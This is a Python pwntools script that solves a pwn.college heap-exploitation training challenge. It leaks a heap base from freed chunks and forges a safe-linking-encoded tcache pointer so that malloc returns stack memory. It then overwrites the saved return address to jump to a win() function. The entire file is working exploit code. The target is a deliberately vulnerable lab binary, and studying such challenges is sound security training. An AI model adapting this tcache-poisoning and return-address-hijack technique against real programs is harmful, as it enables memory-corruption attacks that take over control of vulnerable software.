# Dynamic Allocator Misuse - Sus Sequence Safety (Easy)
# https://pwn.college/program-security/dynamic-allocator-misuse/level-17-0
import pwn
from dojotool import find_challenge, protect_ptr
from dojotool.pwntool import tee


def one_round(io: pwn.process):
    tee(io)

    # how to exploit padding and flat_bufsize?? let's hardcode the offset for now
    offset = 0
    if "easy" in str(io.executable):
        offset = 0x170
    if "hard" in str(io.executable):
        offset = 0x110
    pwn.info(f"offset: {hex(offset)}")

    io.recvuntil(b"at: ")
    addrof_local_stack = int(io.recvuntil(b".", drop=True), 16)
    addrof_rbp = addrof_local_stack + offset
    io.recvuntil(b"at: ")
    addrof_main = int(io.recvuntil(b".", drop=True), 16)

    elf = io.elf
    elf.address = addrof_main - elf.symbols["main"]
    addrof_win = elf.symbols["win"]

    def read_byte(idx):
        io.sendline(b"puts %d" % idx)
        io.recvuntil(b"Data: ")
        return pwn.u64(io.recvline(False).ljust(8, b"\x00")[:8])

    pwn.info(f"addrof_rbp:  {hex(addrof_rbp)}")
    pwn.info(f"addrof_win:  {hex(addrof_win)}")
    io.sendline(b"malloc 0 16")
    io.sendline(b"malloc 1 16")
    io.sendline(b"free 0")
    io.sendline(b"free 1")
    heap = read_byte(0) << 12  # last 12 bits is unknown, but irrelevant
    pwn.info(f"addrof_heap: {hex(heap)}")

    io.sendline(b"scanf 1")
    io.sendline(pwn.p64(protect_ptr(heap, addrof_local_stack)))
    io.sendline(b"malloc 0 16")
    io.sendline(b"malloc 1 16")  # slot 1 points to address of slot 0

    io.sendline(b"scanf 1")  # overwrite slot 0's content to point to rbp+0x8
    io.sendline(pwn.p64(addrof_rbp + 0x8))

    io.sendline(b"scanf 0")  # overwrite rbp+0x8 with addrof_win
    io.sendline(pwn.p64(addrof_win))
    io.sendline(b"quit")


def ctf():
    root_bin = find_challenge()
    with pwn.process(root_bin, raw=True, level="error") as io:
        try:
            one_round(io)
            io.recvrepeat()
        except Exception:
            io.recvrepeat(1)
            print()
            raise


if __name__ == "__main__":
    ctf()
